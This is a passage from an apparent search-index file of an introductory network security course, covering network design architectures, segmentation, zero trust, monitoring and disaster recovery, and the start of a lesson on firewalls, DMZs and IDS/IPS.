Version control: - Configuration backups - Before/after states - Change history Network Monitoring and Management SNMP (Simple Network Management Protocol) Monitor device health: - CPU usage - Memory usage - Interface statistics - Temperature - Fan status SNMP versions: - v1: Basic, no security - v2c: Better but still no encryption - v3: Encrypted, authenticated (use this!) NetFlow/sFlow Traffic analysis: - Who's talking to whom - How much bandwidth used - Application identification - Anomaly detection Use cases: - Capacity planning - Security monitoring - Troubleshooting - Billing Syslog Centralized logging: - Collect logs from all devices - Correlation - Long-term retention - Compliance Syslog server: - Receive logs - Parse and index - Alert on patterns - Reporting Log sources: - Routers, switches - Firewalls - Servers - Applications - Security devices Disaster Recovery and Business Continuity Redundant Connections Multiple internet providers: - Different providers - Different paths - Automatic failover - BGP for redundancy Geographic Diversity Separate locations: - Data replication - Disaster recovery site - Different power grids - Different network providers Recovery Time Objective (RTO) How long can you be down? - Critical systems: minutes - Important systems: hours - Non-critical: days Design accordingly: - Hot standby (instant failover) - Warm standby (quick startup) - Cold standby (restore from backup) Recovery Point Objective (RPO) How much data loss is acceptable? - Real-time replication (RPO = 0) - Frequent backups (RPO = minutes/hours) - Daily backups (RPO = 24 hours) Common Design Mistakes Flat networks: - No segmentation - Broadcast storms - Security nightmare Over-complexity: - Too many layers - Difficult to troubleshoot - Management overhead Under-provisioning: - Insufficient bandwidth - No growth room - Performance issues No redundancy: - Single points of failure - Network goes down = business stops Poor documentation: - Can't troubleshoot effectively - Dangerous changes - Knowledge loss when people leave Ignoring security: - Security as afterthought - No defense in depth - Vulnerable to attacks Key Takeaways Good network design: - Segmentation for security - Redundancy for availability - Scalability for growth - Documentation for management - Monitoring for visibility Security integrated: - Multiple layers (defense in depth) - Least privilege access - Zero trust principles - Continuous monitoring No one-size-fits-all: - Match design to requirements - Consider budget - Plan for growth - Regular review and updates Understanding network architecture helps you: - Design secure networks - Identify security gaps - Plan defenses effectively - Troubleshoot issues - Communicate with network teams In the next units, we'll apply these concepts to real-world security scenarios and see how attackers exploit architectural weaknesses.","title":"Lesson 3.3"},{"location":"LECTURES/unit3/lesson3-3/#network-design-and-architecture","text":"Understanding individual network components isn't enough. You need to know how they fit together to create secure, efficient networks. This lesson covers network design principles and common architectures you'll encounter.","title":"Network Design and Architecture"},{"location":"LECTURES/unit3/lesson3-3/#network-design-principles","text":"","title":"Network Design Principles"},{"location":"LECTURES/unit3/lesson3-3/#defense-in-depth","text":"Multiple layers of security: Internet \u2193 Border Firewall (Perimeter) \u2193 DMZ (Public servers) \u2193 Internal Firewall \u2193 Core Network \u251c\u2500 VLANs (Segmentation) \u251c\u2500 IDS/IPS (Detection) \u251c\u2500 Access Controls (Authorization) \u2514\u2500 Encryption (Confidentiality) No single point of failure for security.","title":"Defense in Depth"},{"location":"LECTURES/unit3/lesson3-3/#segmentation","text":"Divide network into zones based on: - Security requirements - Function - Data sensitivity - Trust level Benefits: - Contain breaches - Reduce attack surface - Apply different security policies - Improve performance","title":"Segmentation"},{"location":"LECTURES/unit3/lesson3-3/#redundancy","text":"Eliminate single points of failure: - Multiple internet connections - Redundant switches/routers - Multiple power supplies - Backup systems - Geographic diversity High availability = uptime","title":"Redundancy"},{"location":"LECTURES/unit3/lesson3-3/#scalability","text":"Design for growth: - Add capacity without redesign - Modular architecture - Room for expansion - Future-proof technology choices","title":"Scalability"},{"location":"LECTURES/unit3/lesson3-3/#common-network-architectures","text":"","title":"Common Network Architectures"},{"location":"LECTURES/unit3/lesson3-3/#three-tier-architecture","text":"Traditional enterprise design: \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Core Layer \u2502 High-speed backbone \u2502 (Switches) \u2502 Connects distribution layers \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 No packet manipulation \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Distribution \u2502 Policy enforcement \u2502 Layer \u2502 VLANs, ACLs, routing \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Aggregation point \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Access Layer \u2502 End-user connections \u2502 (Switches) \u2502 Port security \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 PoE for phones, APs Core layer: - Purpose: Fast packet switching - Devices: High-performance Layer 3 switches - Features: Redundancy, high bandwidth - Minimal processing (routing only) Distribution layer: - Purpose: Policy enforcement, routing - Devices: Layer 3 switches, routers - Features: VLANs, ACLs, firewalls - Connect access to core Access layer: - Purpose: End-device connections - Devices: Layer 2 switches - Features: PoE, port security, VLANs - Desktops, printers, phones, APs Advantages: - Clear hierarchy - Scalable - Maintainable - Predictable performance Disadvantages: - Can be overbuilt for small networks - More equipment = more cost - Complexity","title":"Three-Tier Architecture"},{"location":"LECTURES/unit3/lesson3-3/#two-tier-collapsed-core","text":"Simplified for smaller networks: \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Core/Distribution\u2502 Combined layer \u2502 Layer \u2502 Routing + policy \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Access Layer \u2502 End-user connections \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 When to use: - Smaller organizations - Limited budget - Fewer users (<500) - Less complex requirements","title":"Two-Tier (Collapsed Core)"},{"location":"LECTURES/unit3/lesson3-3/#spine-leaf-architecture","text":"Modern data center design: Spine1 Spine2 Spine3 \u2502 \u2502 \u2502 \u250c\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510 \u2502 \u2502 \u2502 \u2502 Leaf1 Leaf2 Leaf3 Leaf4 \u2502 \u2502 \u2502 \u2502 Servers Servers Servers Servers Characteristics: - Every leaf connects to every spine - Two hops between any servers - Predictable latency - Easy to scale (add leaf switches) - No spanning tree needed Advantages: - Low latency - High bandwidth - Scalability - Redundancy Use cases: - Data centers - Cloud providers - High-performance computing","title":"Spine-Leaf Architecture"},{"location":"LECTURES/unit3/lesson3-3/#hub-and-spoke-star","text":"Central site with remote locations: HQ (Hub) / | \\ / | \\ Branch Branch Branch (Spoke)(Spoke)(Spoke) Characteristics: - All traffic goes through hub - Spokes don't connect directly - Centralized management/security - VPN connections Advantages: - Centralized control - Easier security management - Simplified monitoring Disadvantages: - Hub is single point of failure - Bandwidth bottleneck at hub - Spoke-to-spoke requires two hops","title":"Hub and Spoke (Star)"},{"location":"LECTURES/unit3/lesson3-3/#full-mesh","text":"Every site connects to every other site: Site A \u2500\u2500\u2500 Site B \u2502 \\ / \u2502 \u2502 \\ / \u2502 \u2502 \\ / \u2502 Site C \u2500\u2500\u2500 Site D Advantages: - No single point of failure - Direct paths (low latency) - Load distribution Disadvantages: - Expensive (many connections) - Complex management - Scales poorly (n\u00d7(n-1)/2 connections) Use cases: - Critical systems - Financial trading - When budget allows","title":"Full Mesh"},{"location":"LECTURES/unit3/lesson3-3/#partial-mesh","text":"Compromise between hub-spoke and full mesh: - Critical sites: full mesh - Less critical: hub-and-spoke - Best of both worlds","title":"Partial Mesh"},{"location":"LECTURES/unit3/lesson3-3/#network-zones","text":"","title":"Network Zones"},{"location":"LECTURES/unit3/lesson3-3/#dmz-demilitarized-zone","text":"Purpose: Host public-facing services Design: Internet \u2193 Firewall 1 (External) \u2193 DMZ \u251c\u2500 Web servers \u251c\u2500 Email servers \u251c\u2500 DNS servers \u2514\u2500 FTP servers \u2193 Firewall 2 (Internal) \u2193 Internal Network Rules: - Internet \u2192 DMZ: Limited access (HTTP, HTTPS, SMTP) - DMZ \u2192 Internal: Very restricted (database queries only) - Internal \u2192 DMZ: Manage servers - Internal \u2192 Internet: Through firewall Security benefits: - Public servers isolated - Breach contained to DMZ - Internal network protected - Two firewalls provide defense in depth","title":"DMZ (Demilitarized Zone)"},{"location":"LECTURES/unit3/lesson3-3/#internal-network","text":"Corporate network for employees: Segmentation by: - Department (Sales, Engineering, HR) - Function (User workstations, Printers, VoIP) - Security level (Standard, Restricted, Confidential) Example VLANs: VLAN 10: Users (192.168.10.0/24) VLAN 20: Servers (192.168.20.0/24) VLAN 30: Management (192.168.30.0/24) VLAN 40: Guest (192.168.40.0/24) VLAN 50: VoIP (192.168.50.0/24)","title":"Internal Network"},{"location":"LECTURES/unit3/lesson3-3/#management-network","text":"Separate network for device management: Out-of-band management: - Dedicated network - Physical separation - Even if production network fails - Accessible via console servers Devices managed: - Switches - Routers - Firewalls - Servers (IPMI, iLO, iDRAC) Security: - Extremely restricted access - VPN required - MFA mandatory - All actions logged","title":"Management Network"},{"location":"LECTURES/unit3/lesson3-3/#guest-network","text":"Visitors and untrusted devices: Characteristics: - Isolated from internal network - Internet access only - Captive portal (login page) - Bandwidth limits - Time limits - Content filtering Security: - No access to internal resources - Separate VLAN - Separate IP range - Strict firewall rules Implementation: Guest VLAN 40 \u2193 Firewall rules: Allow: Internet (HTTP, HTTPS) Deny: Internal networks Deny: Private IP ranges","title":"Guest Network"},{"location":"LECTURES/unit3/lesson3-3/#wireless-network-design","text":"","title":"Wireless Network Design"},{"location":"LECTURES/unit3/lesson3-3/#site-survey","text":"Before deploying wireless: Physical survey: - Building layout - Construction materials (affect signal) - Sources of interference - Coverage requirements - Capacity requirements RF survey: - Measure signal strength - Identify dead zones - Find interference sources - Optimize channel selection - Determine AP placement Tools: - Ekahau - NetSpot - AirMagnet - inSSIDer","title":"Site Survey"},{"location":"LECTURES/unit3/lesson3-3/#controller-vs-autonomous-aps","text":"Controller-based (Enterprise): - Central wireless controller - Manages multiple APs - Centralized configuration - Roaming support - Guest portal - Scalable Autonomous APs (Standalone): - Each AP configured independently - No controller needed - Simpler (small deployments) - Lower cost","title":"Controller vs. Autonomous APs"},{"location":"LECTURES/unit3/lesson3-3/#wireless-security-architecture","text":"SSID strategy: Corporate SSID \u251c\u2500 WPA2-Enterprise (802.1X) \u251c\u2500 Corporate VLAN \u2514\u2500 Access to internal resources Guest SSID \u251c\u2500 WPA2-PSK or open with captive portal \u251c\u2500 Guest VLAN \u2514\u2500 Internet only Best practices: - Separate SSIDs for different purposes - Unique VLANs per SSID - Enterprise authentication for employees - Guest isolation - Regular security audits","title":"Wireless Security Architecture"},{"location":"LECTURES/unit3/lesson3-3/#cloud-network-architecture","text":"","title":"Cloud Network Architecture"},{"location":"LECTURES/unit3/lesson3-3/#hybrid-cloud","text":"Combination of on-premises and cloud: On-Premises Data Center \u2193 VPN/Direct Connect \u2193 Cloud (AWS/Azure/GCP) Use cases: - Gradual migration - Burst capacity - Disaster recovery - Data sovereignty requirements","title":"Hybrid Cloud"},{"location":"LECTURES/unit3/lesson3-3/#multi-cloud","text":"Multiple cloud providers: - Avoid vendor lock-in - Leverage best features of each - Geographic distribution - Redundancy Challenges: - Complex management - Security consistency - Cost tracking - Network connectivity","title":"Multi-Cloud"},{"location":"LECTURES/unit3/lesson3-3/#cloud-network-components","text":"VPC (Virtual Private Cloud): - Logically isolated network - Define IP range - Subnets (public/private) - Route tables - Internet/NAT gateways Security Groups: - Virtual firewalls - Instance-level - Stateful - Allow rules only Network ACLs: - Subnet-level - Stateless - Allow and deny rules VPC Peering: - Connect VPCs - Private connectivity - No internet gateway Transit Gateway: - Central hub for VPC connectivity - Simplify complex networks","title":"Cloud Network Components"},{"location":"LECTURES/unit3/lesson3-3/#zero-trust-architecture","text":"Never trust, always verify:","title":"Zero Trust Architecture"},{"location":"LECTURES/unit3/lesson3-3/#traditional-perimeter-model","text":"Internet (Untrusted) \u2193 Firewall \u2193 Internal Network (Trusted) Problem: Assumes internal = safe","title":"Traditional Perimeter Model"},{"location":"LECTURES/unit3/lesson3-3/#zero-trust-model","text":"Every Request \u2193 Authenticate \u2193 Authorize \u2193 Encrypt \u2193 Continuous Verification Principles: 1. Verify explicitly: Always authenticate and authorize 2. Least privilege: Minimum necessary access 3. Assume breach: Limit blast radius","title":"Zero Trust Model"},{"location":"LECTURES/unit3/lesson3-3/#implementation","text":"Micro-segmentation: - Granular network zones - Per-application firewalls - Workload-specific policies Identity-based access: - User and device identity - Continuous authentication - Context-aware (location, time, device posture) Software-defined perimeter: - Application-level access - Hide infrastructure - Only authorized users see resources Components: - Identity provider (Azure AD, Okta) - Access proxy - Policy engine - Endpoint verification - Encryption everywhere","title":"Implementation"},{"location":"LECTURES/unit3/lesson3-3/#network-documentation","text":"Critical for security and operations:","title":"Network Documentation"},{"location":"LECTURES/unit3/lesson3-3/#physical-diagrams","text":"Rack layouts: - Equipment placement - Cable management - Power distribution - Cooling Site diagrams: - Building locations - Equipment rooms - Cable paths - Access points","title":"Physical Diagrams"},{"location":"LECTURES/unit3/lesson3-3/#logical-diagrams","text":"Network topology: - Devices and connections - IP addressing - VLANs - Routing Security zones: - Trust boundaries - Firewall placement - DMZ layout - Access controls","title":"Logical Diagrams"},{"location":"LECTURES/unit3/lesson3-3/#configuration-documentation","text":"IP addressing scheme: 10.0.0.0/8 - Corporate 10.1.0.0/16 - HQ 10.1.10.0/24 - Servers 10.1.20.0/24 - Users 10.1.30.0/24 - Printers 10.2.0.0/16 - Branch 1 10.3.0.0/16 - Branch 2 VLAN assignments: - VLAN numbers and names - IP ranges - Purpose - Security requirements Firewall rules: - Rule number - Source/destination - Action - Purpose - Date created - Owner","title":"Configuration Documentation"},{"location":"LECTURES/unit3/lesson3-3/#change-management","text":"Document all changes: - What changed - Why it changed - Who approved - When it changed - Rollback plan Version control: - Configuration backups - Before/after states - Change history","title":"Change Management"},{"location":"LECTURES/unit3/lesson3-3/#network-monitoring-and-management","text":"","title":"Network Monitoring and Management"},{"location":"LECTURES/unit3/lesson3-3/#snmp-simple-network-management-protocol","text":"Monitor device health: - CPU usage - Memory usage - Interface statistics - Temperature - Fan status SNMP versions: - v1: Basic, no security - v2c: Better but still no encryption - v3: Encrypted, authenticated (use this!)","title":"SNMP (Simple Network Management Protocol)"},{"location":"LECTURES/unit3/lesson3-3/#netflowsflow","text":"Traffic analysis: - Who's talking to whom - How much bandwidth used - Application identification - Anomaly detection Use cases: - Capacity planning - Security monitoring - Troubleshooting - Billing","title":"NetFlow/sFlow"},{"location":"LECTURES/unit3/lesson3-3/#syslog","text":"Centralized logging: - Collect logs from all devices - Correlation - Long-term retention - Compliance Syslog server: - Receive logs - Parse and index - Alert on patterns - Reporting Log sources: - Routers, switches - Firewalls - Servers - Applications - Security devices","title":"Syslog"},{"location":"LECTURES/unit3/lesson3-3/#disaster-recovery-and-business-continuity","text":"","title":"Disaster Recovery and Business Continuity"},{"location":"LECTURES/unit3/lesson3-3/#redundant-connections","text":"Multiple internet providers: - Different providers - Different paths - Automatic failover - BGP for redundancy","title":"Redundant Connections"},{"location":"LECTURES/unit3/lesson3-3/#geographic-diversity","text":"Separate locations: - Data replication - Disaster recovery site - Different power grids - Different network providers","title":"Geographic Diversity"},{"location":"LECTURES/unit3/lesson3-3/#recovery-time-objective-rto","text":"How long can you be down? - Critical systems: minutes - Important systems: hours - Non-critical: days Design accordingly: - Hot standby (instant failover) - Warm standby (quick startup) - Cold standby (restore from backup)","title":"Recovery Time Objective (RTO)"},{"location":"LECTURES/unit3/lesson3-3/#recovery-point-objective-rpo","text":"How much data loss is acceptable? - Real-time replication (RPO = 0) - Frequent backups (RPO = minutes/hours) - Daily backups (RPO = 24 hours)","title":"Recovery Point Objective (RPO)"},{"location":"LECTURES/unit3/lesson3-3/#common-design-mistakes","text":"Flat networks: - No segmentation - Broadcast storms - Security nightmare Over-complexity: - Too many layers - Difficult to troubleshoot - Management overhead Under-provisioning: - Insufficient bandwidth - No growth room - Performance issues No redundancy: - Single points of failure - Network goes down = business stops Poor documentation: - Can't troubleshoot effectively - Dangerous changes - Knowledge loss when people leave Ignoring security: - Security as afterthought - No defense in depth - Vulnerable to attacks","title":"Common Design Mistakes"},{"location":"LECTURES/unit3/lesson3-3/#key-takeaways","text":"Good network design: - Segmentation for security - Redundancy for availability - Scalability for growth - Documentation for management - Monitoring for visibility Security integrated: - Multiple layers (defense in depth) - Least privilege access - Zero trust principles - Continuous monitoring No one-size-fits-all: - Match design to requirements - Consider budget - Plan for growth - Regular review and updates Understanding network architecture helps you: - Design secure networks - Identify security gaps - Plan defenses effectively - Troubleshoot issues - Communicate with network teams In the next units, we'll apply these concepts to real-world security scenarios and see how attackers exploit architectural weaknesses.","title":"Key Takeaways"},{"location":"LECTURES/unit4/lesson4-1/","text":"Real Life Applications and Methods of Network Security Theory is important, but let's talk about how network security actually works in the real world. What do security professionals do day-to-day? What technologies do they use? How do organizations actually protect their networks? The Security Operations Center (SOC) In most medium to large organizations, network security is monitored from a Security Operations Center (SOC) \u2014a centralized unit that monitors, detects, analyzes, and responds to security incidents. A typical SOC includes: - Security analysts monitoring dashboards showing network traffic, alerts, and system logs - Incident responders who investigate and mitigate active security events - Threat hunters who proactively search for signs of compromise - Security engineers who design and implement security controls The SOC operates 24/7 because cyber attacks don't follow business hours. Analysts work in shifts, watching for anomalies that might indicate an attack. Defense in Depth: Layered Security No single security control is perfect. The principle of defense in depth means implementing multiple layers of security so that if one layer fails, others still protect the network. Think of it like protecting a castle: - Outer walls (perimeter firewall) - Guards at the gate (intrusion detection systems) - Locks on doors (access controls) - Guards inside (endpoint protection) - Vault for treasures (data encryption) - Alarm system (logging and monitoring) An attacker would have to breach multiple layers to succeed. This is the foundation of modern network security. Perimeter Security The network perimeter is the boundary between your internal network and the outside world (usually the internet). Perimeter security is your first line of defense. Firewalls: The Network Gatekeeper Firewalls are devices or software that filter network traffic based on security rules. They're like bouncers at a club\u2014checking credentials and only letting in approved traffic. Types of firewalls: Packet-Filtering Firewalls (Layer 3-4): - Examine individual packets - Check source/destination IP, ports, and protocols - Fast but limited\u2014can't see application content - Example rule: \"Block all traffic from IP 10.0.0.50\" Stateful Firewalls : - Track the state of connections (established, new, related) - More secure than packet filtering - Know if traffic is part of an existing legitimate connection - Most common type in use today Application-Layer Firewalls (Layer 7): - Inspect actual application data - Can block specific URLs, detect malware, filter content - Also called Web Application Firewalls (WAF) when protecting web apps - More processing intensive but much more capable Next-Generation Firewalls (NGFW) : - Combine traditional firewall functions with: - Deep packet inspection - Intrusion prevention - Application awareness - Malware detection - SSL/TLS inspection - Industry standard for enterprise networks DMZ: The Demilitarized Zone A DMZ is a separate network segment that sits between your internal network and the internet. It hosts public-facing services like web servers, email servers, and FTP servers. Why use a DMZ? - External users can access public services without reaching your internal network - If a DMZ server is compromised, attackers still can't easily reach internal systems - Allows you to apply different, stricter security rules to the DMZ Architecture typically looks like: Internet \u2192 Firewall 1 \u2192 DMZ (web servers, email) \u2192 Firewall 2 \u2192 Internal Network Both firewalls filter traffic, creating two barriers an attacker must breach. Intrusion Detection and Prevention Firewalls allow or block traffic based on rules, but what about legitimate traffic that contains malicious content? That's where IDS and IPS come in. IDS (Intrusion Detection System) An IDS monitors network traffic for suspicious activity and generates alerts. It's like a security camera\u2014it watches and warns you, but doesn't actively stop threats. How it works: - Signature-based detection : Looks for known attack patterns (like antivirus signatures) - Anomaly-based detection : Establishes a baseline of normal behavior and alerts on deviations - Behavioral-based detection : Looks for behavior patterns associated with attacks Placement : - Network-based IDS (NIDS): Monitors network traffic - Host-based IDS (HIDS): Monitors individual systems Pros : No risk of blocking legitimate traffic Cons : Doesn't stop attacks, requires human response IPS (Intrusion Prevention System) An IPS is like an IDS that can actively block threats. It sits inline with network traffic and can drop malicious packets or block suspicious connections. How it differs from IDS: - Can automatically block attacks - Sits inline (traffic flows through it) - Must be extremely accurate to avoid blocking legitimate traffic Challenges: - False positives : Blocking legitimate traffic by mistake - Performance : Inline inspection adds latency - Bypass risk : If the IPS fails, should traffic flow or stop? Most organizations use both: IPS for known threats and critical systems, IDS for monitoring and detecting new threats. Network Segmentation Network segmentation divides a network into multiple smaller networks or zones. This is one of the most effective security controls because it limits the damage from a breach. Why Segment? If your entire network is flat (all devices can talk to all other devices), a single compromised device gives an attacker access to everything. This is called lateral movement \u2014moving from one compromised system to others. Segmentation prevents this by: - Isolating critical systems - Limiting blast radius of a breach - Enforcing different security policies for different segments - Improving network performance by reducing broadcast domains Common Segmentation Strategies By Function: - Corporate network (employee computers) - Guest network (visitors) - Server network (databases, applications) - Management network (for administering other networks) - IoT network (printers, cameras, smart devices) By Security Level: - Public zone (DMZ) - Internal zone (standard security) - Restricted zone (sensitive data, high security) - Critical zone (payment systems, highest security) By Department: - Engineering network - HR network (handles sensitive employee data) - Finance network (handles financial data) - Sales network Implementation Methods VLANs (Virtual Local Area Networks): - Logical segmentation on the same physical switches - Devices in different VLANs can't communicate without a router - Configured through software, not physical cables - Cost-effective for most organizations Physical Segmentation : - Completely separate networks with separate hardware - Most secure but expensive - Used for highly sensitive environments Software-Defined Networking (SDN) : - Centrally managed virtual networks - Dynamic, programmable segmentation - Growing in popularity for cloud and data center environments VPN: Secure Remote Access Virtual Private Networks (VPNs) create encrypted tunnels through public networks, allowing secure remote access. Types of VPNs Site-to-Site VPN: - Connects entire networks (like connecting branch offices) - Always-on connection - Transparent to end users Remote Access VPN: - Individual users connect from outside the network - User must authenticate - Common for work-from-home employees SSL/TLS VPN: - Browser-based access - No special client software required - Often used for limited access to specific applications IPsec VPN: - Protocol suite for securing IP communications - More complex but very secure - Industry standard for site-to-site VPNs VPN Security Considerations Benefits: - Encrypts traffic over untrusted networks - Hides user's actual IP address - Bypasses geographic restrictions Risks: - VPN endpoints are high-value targets - Poorly configured VPNs can be exploited - Compromised VPN credentials give attackers direct network access - VPN traffic can be difficult to inspect for threats Network Access Control (NAC) NAC systems control which devices can connect to your network and what they can access once connected. How NAC Works Before a device connects: 1. Device attempts to connect 2. NAC system challenges it (authenticate yourself) 3. NAC checks device compliance (is antivirus updated? OS patched? Authorized device?) 4. Based on results, NAC either allows full access, quarantines the device, or blocks it entirely Use Cases BYOD (Bring Your Own Device) environments : Personal laptops and phones connecting to corporate networks Guest access : Give visitors internet access without internal network access Compliance enforcement : Ensure all devices meet security standards before connecting Quarantine networks : Isolate infected devices until they're cleaned Zero Trust Architecture The traditional security model assumed \"inside the network\" = trusted and \"outside\" = untrusted. But modern threats (insider threats, compromised devices, remote work) make this obsolete. Zero Trust assumes: - Never trust, always verify - No device or user is trusted by default - Verify explicitly for every access request - Minimize user access (principle of least privilege) - Assume breach (design for damage containment) Zero Trust Implementation Identity and Access Management (IAM): - Multi-factor authentication (MFA) for all users - Continuous authentication - Risk-based access (different access levels based on context) Micro-segmentation: - Granular network segments, sometimes per-application - Strict controls between segments - Limits lateral movement to nearly zero Continuous Monitoring: - Log everything - Analyze behavior constantly - Detect and respond to anomalies in real-time Least Privilege Access: - Users only get the minimum access needed - Time-limited access for administrative tasks - Just-in-time access provisioning Zero Trust is the future of network security, especially as networks become more distributed with cloud services and remote work. Cloud Network Security As organizations move to cloud platforms (AWS, Azure, Google Cloud), network security changes but remains critical. Cloud-Specific Challenges Shared responsibility model : Cloud provider secures the infrastructure; you secure your applications and data Virtual networks : Everything is software-defined Multi-tenancy : Your workloads share physical infrastructure with other customers API-driven : Configuration happens through APIs, creating new attack vectors Cloud Security Tools Security Groups : Virtual firewalls for cloud instances Network ACLs : Subnet-level filtering VPC (Virtual Private Cloud) : Isolated network environments in the cloud Cloud Access Security Brokers (CASB) : Monitor and secure cloud service usage Real-World Scenarios Let's look at how these technologies work together in practice: Scenario 1: Remote Worker Connecting Employee's laptop connects to company VPN NAC system checks: is device authorized? Is software updated? VPN authenticates user with username, password, and MFA token VPN creates encrypted tunnel User placed in appropriate network segment based on role Firewall rules allow access only to needed resources IPS monitors traffic for suspicious behavior All activity logged for security analysis Scenario 2: Public Web Application User visits company website Traffic hits web application firewall (WAF) WAF inspects request for SQL injection, XSS, etc. Clean request passes to load balancer Web server in DMZ handles request Web server queries database in internal network Firewall between DMZ and internal network only allows specific database queries Response travels back through same path All stages logged and monitored Scenario 3: Suspected Breach IDS detects unusual outbound connection from internal server Alert goes to SOC Analyst investigates: server is compromised Firewall immediately blocks server's network access (quarantine) Incident response team examines server Network logs reviewed to determine scope Other systems in same segment scanned for compromise After cleanup, server returns to production with enhanced monitoring Practical Tools Here are tools you'll actually use in network security: Wireshark : Capture and analyze network packets Nmap : Network scanning and service discovery Snort : Open-source IDS/IPS pfSense : Open-source firewall and router Zeek (formerly Bro): Network security monitoring tcpdump : Command-line packet capture iptables/nftables : Linux firewall configuration We'll dive deeper into many of these tools in upcoming lessons. Key Takeaways Network security in practice means: - Multiple layers of defense - Continuous monitoring and analysis - Segmentation to limit damage - Strong access controls - Regular updates and patching - Incident response preparedness No network is 100% secure, but with proper implementation of these technologies and strategies, you can make it extremely difficult for attackers to succeed. The goal isn't perfection\u2014it's making your network harder to attack than your competitors' networks, and ensuring that when breaches do occur, you can detect and respond quickly.","title":"Lesson 4.1"},{"location":"LECTURES/unit4/lesson4-1/#real-life-applications-and-methods-of-network-security","text":"Theory is important, but let's talk about how network security actually works in the real world. What do security professionals do day-to-day? What technologies do they use? How do organizations actually protect their networks?","title":"Real Life Applications and Methods of Network Security"},{"location":"LECTURES/unit4/lesson4-1/#the-security-operations-center-soc","text":"In most medium to large organizations, network security is monitored from a Security Operations Center (SOC) \u2014a centralized unit that monitors, detects, analyzes, and responds to security incidents. A typical SOC includes: - Security analysts monitoring dashboards showing network traffic, alerts, and system logs - Incident responders who investigate and mitigate active security events - Threat hunters who proactively search for signs of compromise - Security engineers who design and implement security controls The SOC operates 24/7 because cyber attacks don't follow business hours. Analysts work in shifts, watching for anomalies that might indicate an attack.","title":"The Security Operations Center (SOC)"},{"location":"LECTURES/unit4/lesson4-1/#defense-in-depth-layered-security","text":"No single security control is perfect. The principle of defense in depth means implementing multiple layers of security so that if one layer fails, others still protect the network. Think of it like protecting a castle: - Outer walls (perimeter firewall) - Guards at the gate (intrusion detection systems) - Locks on doors (access controls) - Guards inside (endpoint protection) - Vault for treasures (data encryption) - Alarm system (logging and monitoring) An attacker would have to breach multiple layers to succeed. This is the foundation of modern network security.","title":"Defense in Depth: Layered Security"},{"location":"LECTURES/unit4/lesson4-1/#perimeter-security","text":"The network perimeter is the boundary between your internal network and the outside world (usually the internet). Perimeter security is your first line of defense.","title":"Perimeter Security"},{"location":"LECTURES/unit4/lesson4-1/#firewalls-the-network-gatekeeper","text":"Firewalls are devices or software that filter network traffic based on security rules. They're like bouncers at a club\u2014checking credentials and only letting in approved traffic. Types of firewalls: Packet-Filtering Firewalls (Layer 3-4): - Examine individual packets - Check source/destination IP, ports, and protocols - Fast but limited\u2014can't see application content - Example rule: \"Block all traffic from IP 10.0.0.50\" Stateful Firewalls : - Track the state of connections (established, new, related) - More secure than packet filtering - Know if traffic is part of an existing legitimate connection - Most common type in use today Application-Layer Firewalls (Layer 7): - Inspect actual application data - Can block specific URLs, detect malware, filter content - Also called Web Application Firewalls (WAF) when protecting web apps - More processing intensive but much more capable Next-Generation Firewalls (NGFW) : - Combine traditional firewall functions with: - Deep packet inspection - Intrusion prevention - Application awareness - Malware detection - SSL/TLS inspection - Industry standard for enterprise networks","title":"Firewalls: The Network Gatekeeper"},{"location":"LECTURES/unit4/lesson4-1/#dmz-the-demilitarized-zone","text":"A DMZ is a separate network segment that sits between your internal network and the internet. It hosts public-facing services like web servers, email servers, and FTP servers. Why use a DMZ? - External users can access public services without reaching your internal network - If a DMZ server is compromised, attackers still can't easily reach internal systems - Allows you to apply different, stricter security rules to the DMZ Architecture typically looks like: Internet \u2192 Firewall 1 \u2192 DMZ (web servers, email) \u2192 Firewall 2 \u2192 Internal Network Both firewalls filter traffic, creating two barriers an attacker must breach.","title":"DMZ: The Demilitarized Zone"},{"location":"LECTURES/unit4/lesson4-1/#intrusion-detection-and-prevention","text":"Firewalls allow or block traffic based on rules, but what about legitimate traffic that contains malicious content? That's where IDS and IPS come in.","title":"Intrusion Detection and Prevention"},{"location":"LECTURES/unit4/lesson4-1/#ids-intrusion-detection-system","text":"An IDS monitors network traffic for suspicious activity and generates alerts. It's like a security camera\u2014it watches and warns you, but doesn't actively stop threats. How it works: - Signature-based detection : Looks for known attack patterns (like antivirus signatures) - Anomaly-based detection : Establishes a baseline of normal behavior and alerts on deviations - Behavioral-based detection : Looks for behavior patterns associated with attacks Placement : - Network-based IDS (NIDS): Monitors network traffic - Host-based IDS (HIDS): Monitors individual systems Pros : No risk of blocking legitimate traffic Cons : Doesn't stop attacks, requires human response","title":"IDS (Intrusion Detection System)"},{"location":"LECTURES/unit4/lesson4-1/#ips-intrusion-prevention-system","text":"An IPS is like an IDS that can actively block threats. It sits inline with network traffic and can drop malicious packets or block suspicious connections. How it differs from IDS: - Can automatically block attacks - Sits inline (traffic flows through it) - Must be extremely accurate to avoid blocking legitimate traffic Challenges: - False positives : Blocking legitimate traffic by mistake - Performance : Inline 